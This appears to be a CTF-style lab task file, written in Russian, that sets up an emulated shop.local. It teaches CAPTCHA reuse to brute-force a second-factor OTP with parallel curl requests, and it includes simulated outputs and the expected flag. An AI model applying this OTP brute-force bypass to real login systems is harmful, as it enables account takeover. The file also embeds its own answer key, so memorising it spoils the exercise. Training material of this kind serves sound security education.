@@ -1,0 +1,42 @@
+{
+  "id": "web-captcha-bypass",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{c4ptch4_r3us3_brut3f0rc3_0tp}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: обход CAPTCHA (reuse ответа)\n\n`shop.local` защищает вход второго фактора капчей. Но `captcha_id` не\nпомечается использованным — одну решённую капчу можно прикладывать к\nнеограниченному числу запросов. Это открывает перебор OTP.\n\n1. Получи капчу и реши её:\n   curl -s https://shop.local/captcha/new\n   curl -s -X POST https://shop.local/login/otp -d 'captcha_id=c_88f1&captcha=4f7k2&otp=0000'\n2. Переиспользуй ту же капчу для burst-перебора кода (`--parallel` + глоб):\n   curl -s --parallel 'https://shop.local/login/otp?captcha_id=c_88f1&captcha=4f7k2&otp=0000..9999&burst=100'\n3. Один из кодов подойдёт — в выводе флаг.\n4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/captcha и /login/otp)",
+      "cases": [
+        {
+          "match": "burst|parallel",
+          "example": "-s --parallel 'https://shop.local/login/otp?captcha_id=c_88f1&captcha=4f7k2&otp=0000..9999&burst=100'",
+          "output": "[1] {\"status\":\"invalid_otp\",\"otp\":\"0000\"}\n[2] {\"status\":\"invalid_otp\",\"otp\":\"0001\"}\n[3] {\"status\":\"invalid_otp\",\"otp\":\"0002\"}\n...\n[42] {\"status\":\"ok\",\"otp\":\"0042\",\"captcha\":\"reused\",\"note\":\"captcha_id never invalidated\",\"flag\":\"nto{c4ptch4_r3us3_brut3f0rc3_0tp}\"}\n"
+        },
+        {
+          "match": "captcha/new",
+          "example": "-s https://shop.local/captcha/new",
+          "output": "{\"captcha_id\":\"c_88f1\",\"image\":\"/captcha/c_88f1.png\"}\n"
+        },
+        {
+          "match": "login/otp",
+          "example": "-s -X POST https://shop.local/login/otp -d 'captcha_id=c_88f1&captcha=4f7k2&otp=0000'",
+          "output": "{\"status\":\"invalid_otp\",\"otp\":\"0000\",\"captcha\":\"accepted\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются /captcha/new и /login/otp на shop.local.\n"
+    }
+  }
+}
